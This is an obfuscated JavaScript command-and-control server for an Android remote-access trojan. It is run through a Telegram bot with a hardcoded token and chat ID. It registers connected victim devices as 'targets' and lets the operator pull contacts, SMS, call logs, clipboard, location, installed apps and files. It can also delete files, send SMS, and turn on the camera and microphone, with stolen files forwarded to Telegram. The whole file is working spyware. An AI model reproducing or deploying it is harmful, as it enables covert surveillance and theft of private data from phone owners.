function _0x5503() {
    const _0x21113b = ['66ZNdSsZ', 'http', '80tPWVMu', 'body-parser', '1716710vlyYlo', '2502076HVozcp', 'uuid', '12VapdUt', '2024390UPeXhf', '1616892jRRLGB', '3156ZtGTZI', 'axios', '5360YNLrFD', '241803DgFjdT', '8825019XADAQr', 'express', 'node-telegram-bot-api'];
    _0x5503 = function() {
        return _0x21113b;
    };
    return _0x5503();
}

function _0x3e17(_0x12e93d, _0x23c86b) {
    const _0x550346 = _0x5503();
    return _0x3e17 = function(_0x3e17ef, _0x32d22a) {
        _0x3e17ef = _0x3e17ef - 0xc7;
        let _0x467a95 = _0x550346[_0x3e17ef];
        return _0x467a95;
    }, _0x3e17(_0x12e93d, _0x23c86b);
}
const _0x4961d6 = _0x3e17;
(function(_0x2a9603, _0x416b29) {
    const _0x249488 = _0x3e17,
        _0x5e8aaa = _0x2a9603();
    while (!![]) {
        try {
            const _0x5224cc = parseInt(_0x249488(0xcc)) / 0x1 + parseInt(_0x249488(0xc8)) / 0x2 + -parseInt(_0x249488(0xcd)) / 0x3 * (parseInt(_0x249488(0xcf)) / 0x4) + -parseInt(_0x249488(0xc7)) / 0x5 * (parseInt(_0x249488(0xca)) / 0x6) + -parseInt(_0x249488(0xd1)) / 0x7 + -parseInt(_0x249488(0xd6)) / 0x8 * (-parseInt(_0x249488(0xd0)) / 0x9) + parseInt(_0x249488(0xcb)) / 0xa * (parseInt(_0x249488(0xd4)) / 0xb);
            if (_0x5224cc === _0x416b29) break;
            else _0x5e8aaa['push'](_0x5e8aaa['shift']());
        } catch (_0x561e80) {
            _0x5e8aaa['push'](_0x5e8aaa['shift']());
        }
    }
}(_0x5503, 0xf2b69));
const socket = require('ws'),
    http = require(_0x4961d6(0xd5)),
    express = require(_0x4961d6(0xd2)),
    TelegramBot = require(_0x4961d6(0xd3)),
    multer = require('multer'),
    bodyParser = require(_0x4961d6(0xd7)),
    uuid4 = require(_0x4961d6(0xc9)),
    axios = require(_0x4961d6(0xce));

const upload = multer();
const app = express()
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new socket.Server({
    server
});
const chatId = '979035419'
const token = '5667202865:AAGh-3st3qbl80wDwktPtjUCMKd2o4FJK9w'
const serverAddr = ''
const bot = new TelegramBot(token, {
    polling: true
});

// request -------------------------------------------------------------------
function _0x4c14() {
    const _0x3edb4c = ['Mic\x201\x20🎤', '/sendLocation', 'sendDocument', 'data', '8330440SpZacJ', 'split', 'cam2', '18rUBxXK', '120495lhjred', 'originalname', 'All\x20Contact\x20👤', 'Server\x20started\x20on\x20port\x20', '<b>', 'send', 'cam1', 'mi2', 'text', 'All\x20Sms\x20💬', 'file', 'Your\x20Request\x20Is\x20On\x20Progress\x20!', 'single', 'Mic\x203\x20🎤', 'clients', 'Call\x20Log\x20📞', '/sendText', 'Get\x20Folder\x20/\x20File\x20📄', '135227VFXWyf', 'df&', '8PWkFWY', 'Device\x20Model\x20📱', 'PORT', 'connection', '<b>☄\x20Select\x20Action\x20For\x20Device\x20:</b>\x0a&', 'Status\x20⚙', 'get', 'mi3', 'Welcome', 'forEach', '161439pIBVgF', 'HTML', '/sendFile', 'gf&', 'everything is fine now edit the apk src', 'Clip\x20Board\x20📄', 'body', '740464YOjhCq', 'socket', '!\x0a\x0a<b>Action\x20Get\x20File\x20/\x20Folder\x0a🔵\x20Please\x20Reply\x20File\x20/\x20Folder\x20Path:</b>', '!\x0a<b>Action\x20Delete\x20File\x20/\x20Folder\x0a🔵\x20Please\x20Reply\x20File\x20/\x20Folder\x20Path:</b>', 'Delete\x20Folder\x20/\x20File\x20🗑', 'size', '</b>\x20🌐', 'sendMessage', 'log', 'Send\x20Sms\x20💬', 'toString', 'listen', 'post', 'ss&', 'reply_to_message', 'address', 'uuid', '<b>ID\x20=>\x20</b><code>', 'replaceAll', '5688936vWUlXN', '<b>New\x20Target\x20Connected\x20📱\x0a\x0aID\x20=\x20<code>', '2svBYgi', 'Action\x20☄', 'port', 'buffer', 'Installed\x20Apps\x20📲', 'mi1', 'catch', 'sendLocation', '1777580wjzGmn'];
    _0x4c14 = function() {
        return _0x3edb4c;
    };
    return _0x4c14();
}
const _0x4956d8 = _0x2559;

function _0x2559(_0x75be18, _0x458b6b) {
    const _0x4c147f = _0x4c14();
    return _0x2559 = function(_0x255919, _0x54a1c0) {
        _0x255919 = _0x255919 - 0x15c;
        let _0x10b682 = _0x4c147f[_0x255919];
        return _0x10b682;
    }, _0x2559(_0x75be18, _0x458b6b);
}(function(_0x438afb, _0x27122c) {
    const _0x574061 = _0x2559,
        _0x401c6d = _0x438afb();
    while (!![]) {
        try {
            const _0x49026d = parseInt(_0x574061(0x174)) / 0x1 * (parseInt(_0x574061(0x19c)) / 0x2) + parseInt(_0x574061(0x180)) / 0x3 * (-parseInt(_0x574061(0x176)) / 0x4) + -parseInt(_0x574061(0x162)) / 0x5 * (parseInt(_0x574061(0x161)) / 0x6) + parseInt(_0x574061(0x1a4)) / 0x7 + -parseInt(_0x574061(0x187)) / 0x8 + -parseInt(_0x574061(0x19a)) / 0x9 + parseInt(_0x574061(0x15e)) / 0xa;
            if (_0x49026d === _0x27122c) break;
            else _0x401c6d['push'](_0x401c6d['shift']());
        } catch (_0x2fd046) {
            _0x401c6d['push'](_0x401c6d['shift']());
        }
    }
}(_0x4c14, 0x4d8ba), app[_0x4956d8(0x17c)]('/', (_0x39f5f5, _0xe7639e) => {
    const _0x13909a = _0x4956d8;
    _0xe7639e[_0x13909a(0x167)](_0x13909a(0x184));
}), app[_0x4956d8(0x193)](_0x4956d8(0x182), upload[_0x4956d8(0x16e)](_0x4956d8(0x16c)), (_0x26510a, _0x451acd) => {
    const _0x187cff = _0x4956d8;
    var _0x8fab1c = _0x26510a[_0x187cff(0x16c)][_0x187cff(0x163)];
    bot[_0x187cff(0x15c)](chatId, _0x26510a[_0x187cff(0x16c)][_0x187cff(0x19f)], {}, {
        'filename': _0x8fab1c,
        'contentType': 'application/txt'
    })[_0x187cff(0x1a2)](function(_0x506a0c) {
        const _0x5b0dd6 = _0x187cff;
        console[_0x5b0dd6(0x18f)](_0x506a0c);
    }), _0x451acd['send'](_0x8fab1c);
}), app[_0x4956d8(0x193)](_0x4956d8(0x172), (_0x12dd3a, _0x4ca86b) => {
    const _0x10a33a = _0x4956d8;
    bot['sendMessage'](chatId, _0x12dd3a[_0x10a33a(0x186)][_0x10a33a(0x15d)], {
        'parse_mode': 'HTML'
    }), _0x4ca86b[_0x10a33a(0x167)](_0x12dd3a['body'][_0x10a33a(0x15d)]);
}), app[_0x4956d8(0x193)](_0x4956d8(0x1a6), (_0x125431, _0x4e551f) => {
    const _0x40b86c = _0x4956d8;
    bot[_0x40b86c(0x1a3)](chatId, _0x125431[_0x40b86c(0x186)]['l1'], _0x125431[_0x40b86c(0x186)]['l2']), _0x4e551f['send'](_0x125431[_0x40b86c(0x186)]['l1'][_0x40b86c(0x191)]());
}), server[_0x4956d8(0x192)](process['env'][_0x4956d8(0x178)] || 0x2327, () => {
    const _0x36a560 = _0x4956d8;
    console[_0x36a560(0x18f)](_0x36a560(0x165) + server[_0x36a560(0x196)]()[_0x36a560(0x19e)]);
}), wss['on'](_0x4956d8(0x179), (_0x108bfc, _0x4a9bdf) => {
    const _0x5eacfc = _0x4956d8;
    _0x108bfc['uuid'] = uuid4['v4'](), bot[_0x5eacfc(0x18e)](chatId, _0x5eacfc(0x19b) + _0x108bfc[_0x5eacfc(0x197)] + '</code>\x0aIP\x20=\x20' + _0x4a9bdf[_0x5eacfc(0x188)]['remoteAddress'][_0x5eacfc(0x191)]()[_0x5eacfc(0x199)]('f', '')['replaceAll'](':', '') + _0x5eacfc(0x18d), {
        'parse_mode': 'HTML'
    });
}), setInterval(() => {
    const _0x10f523 = _0x4956d8;
    wss[_0x10f523(0x170)][_0x10f523(0x17f)](_0x2ee4ba => {
        const _0x7816ca = _0x10f523;
        _0x2ee4ba[_0x7816ca(0x167)]('be\x20alive');
    });
}, 0x7d0), bot['on']('message', _0x2e7dc3 => {
    const _0x506000 = _0x4956d8;
    _0x2e7dc3['text'] === '/start' && bot['sendMessage'](chatId, _0x506000(0x17e), {
        'reply_markup': {
            'keyboard': [
                [_0x506000(0x17b)],
                [_0x506000(0x19d)]
            ]
        }
    });
    if (_0x2e7dc3[_0x506000(0x16a)] === _0x506000(0x17b)) {
        const _0x2dccb1 = wss[_0x506000(0x170)]['size'];
        let _0x1c84a4 = '';
        _0x2dccb1 > 0x0 ? (_0x1c84a4 += _0x506000(0x166) + _0x2dccb1 + '\x20Online\x20Client</b>\x20✅\x0a\x0a', wss[_0x506000(0x170)][_0x506000(0x17f)](_0x7ad7c2 => {
            const _0x27aa7c = _0x506000;
            _0x1c84a4 += _0x27aa7c(0x198) + _0x7ad7c2[_0x27aa7c(0x197)] + '</code>\x0a\x0a';
        })) : _0x1c84a4 += '<b>No\x20Online\x20Client</b>\x20❌', bot['sendMessage'](chatId, _0x1c84a4, {
            'parse_mode': _0x506000(0x181)
        });
    }
    if (_0x2e7dc3[_0x506000(0x16a)] === 'Action\x20☄') {
        const _0x2768bb = wss[_0x506000(0x170)][_0x506000(0x18c)];
        if (_0x2768bb > 0x0) {
            let _0x68c31c = [
                [{
                    'text': _0x506000(0x171),
                    'callback_data': 'cl'
                }, {
                    'text': _0x506000(0x164),
                    'callback_data': 'gc'
                }],
                [{
                    'text': _0x506000(0x16b),
                    'callback_data': 'as'
                }, {
                    'text': _0x506000(0x190),
                    'callback_data': 'ss'
                }],
                [{
                    'text': _0x506000(0x1a0),
                    'callback_data': 'ia'
                }, {
                    'text': _0x506000(0x177),
                    'callback_data': 'dm'
                }],
                [{
                    'text': _0x506000(0x173),
                    'callback_data': 'gf'
                }, {
                    'text': _0x506000(0x18b),
                    'callback_data': 'df'
                }],
                [{
                    'text': 'Main\x20Camera\x20📷',
                    'callback_data': _0x506000(0x168)
                }, {
                    'text': 'Front\x20Camera\x20🤳',
                    'callback_data': _0x506000(0x160)
                }],
                [{
                    'text': _0x506000(0x1a5),
                    'callback_data': _0x506000(0x1a1)
                }, {
                    'text': 'Mic\x202\x20🎤',
                    'callback_data': _0x506000(0x169)
                }, {
                    'text': _0x506000(0x16f),
                    'callback_data': _0x506000(0x17d)
                }],
                [{
                    'text': _0x506000(0x185),
                    'callback_data': 'cp'
                }]
            ];
            wss[_0x506000(0x170)][_0x506000(0x17f)](_0x2fd5b6 => {
                const _0x21d68c = _0x506000;
                bot[_0x21d68c(0x18e)](chatId, _0x21d68c(0x17a) + _0x2fd5b6[_0x21d68c(0x197)], {
                    'reply_markup': {
                        'inline_keyboard': _0x68c31c
                    },
                    'parse_mode': _0x21d68c(0x181)
                });
            });
        } else bot[_0x506000(0x18e)](chatId, '<b>No\x20Online\x20Client</b>\x20❌', {
            'parse_mode': 'HTML'
        });
    }
    if (_0x2e7dc3[_0x506000(0x195)]) {
        if (_0x2e7dc3[_0x506000(0x195)]['text'][_0x506000(0x15f)]('&')[0x0] === 'ss') {
            const _0x191c29 = _0x2e7dc3[_0x506000(0x16a)][_0x506000(0x15f)](']')[0x0]['split']('[')[0x1],
                _0x5af05c = _0x2e7dc3[_0x506000(0x195)][_0x506000(0x16a)][_0x506000(0x15f)]('!')[0x0][_0x506000(0x15f)]('&')[0x1];
            wss[_0x506000(0x170)][_0x506000(0x17f)](_0x4462d0 => {
                const _0x1ab50e = _0x506000;
                _0x4462d0['uuid'] === _0x5af05c && _0x4462d0[_0x1ab50e(0x167)](_0x1ab50e(0x194) + _0x191c29);
            }), bot['sendMessage'](chatId, 'Your\x20Request\x20Is\x20On\x20Progress\x20!', {
                'reply_markup': {
                    'keyboard': [
                        [_0x506000(0x17b)],
                        ['Action\x20☄']
                    ]
                }
            });
        }
        if (_0x2e7dc3[_0x506000(0x195)][_0x506000(0x16a)][_0x506000(0x15f)]('&')[0x0] === 'df' || _0x2e7dc3[_0x506000(0x195)][_0x506000(0x16a)][_0x506000(0x15f)]('&')[0x0] === 'gf') {
            const _0x21b5e0 = _0x2e7dc3[_0x506000(0x195)][_0x506000(0x16a)],
                _0x37a86f = _0x21b5e0[_0x506000(0x15f)]('!')[0x0][_0x506000(0x15f)]('&')[0x0],
                _0xc89aed = _0x21b5e0[_0x506000(0x15f)]('!')[0x0][_0x506000(0x15f)]('&')[0x1],
                _0x99de45 = _0x2e7dc3['text'];
            wss[_0x506000(0x170)][_0x506000(0x17f)](_0x154abc => {
                const _0x487a2e = _0x506000;
                _0x154abc[_0x487a2e(0x197)] === _0xc89aed && _0x154abc[_0x487a2e(0x167)](_0x37a86f + '&' + _0x99de45);
            }), bot[_0x506000(0x18e)](chatId, _0x506000(0x16d), {
                'reply_markup': {
                    'keyboard': [
                        [_0x506000(0x17b)],
                        ['Action\x20☄']
                    ]
                }
            });
        }
    }
}), bot['on']('callback_query', function onCallbackQuery(_0x5dbf90) {
    const _0x10ceae = _0x4956d8,
        _0x1d0e4c = _0x5dbf90[_0x10ceae(0x15d)],
        _0x4dbd1f = _0x5dbf90['message']['text'][_0x10ceae(0x15f)]('&')[0x1];
    wss['clients'][_0x10ceae(0x17f)](_0x3409a8 => {
        const _0x268d4f = _0x10ceae;
        if (_0x3409a8['uuid'] === _0x4dbd1f) {
            if (_0x1d0e4c === 'ss') bot[_0x268d4f(0x18e)](chatId, _0x268d4f(0x194) + _0x3409a8[_0x268d4f(0x197)] + '!\x0a\x0a<b>Action\x20Send\x20Sms\x0a🔵\x20Please\x20Reply\x0a</b>\x20<code>[{\x22number\x22:\x22target\x20number\x22,\x22message\x22:\x22your\x20message\x22}]</code>', {
                'reply_markup': {
                    'force_reply': !![]
                },
                'parse_mode': _0x268d4f(0x181)
            });
            else {
                if (_0x1d0e4c === 'gf') bot['sendMessage'](chatId, _0x268d4f(0x183) + _0x3409a8[_0x268d4f(0x197)] + _0x268d4f(0x189), {
                    'reply_markup': {
                        'force_reply': !![]
                    },
                    'parse_mode': _0x268d4f(0x181)
                });
                else _0x1d0e4c === 'df' ? bot['sendMessage'](chatId, _0x268d4f(0x175) + _0x3409a8[_0x268d4f(0x197)] + _0x268d4f(0x18a), {
                    'reply_markup': {
                        'force_reply': !![]
                    },
                    'parse_mode': _0x268d4f(0x181)
                }) : _0x3409a8[_0x268d4f(0x167)](_0x1d0e4c);
            }
        }
    });
}), setInterval(() => {
    axios['get'](serverAddr);
}, 0x1d4c0));
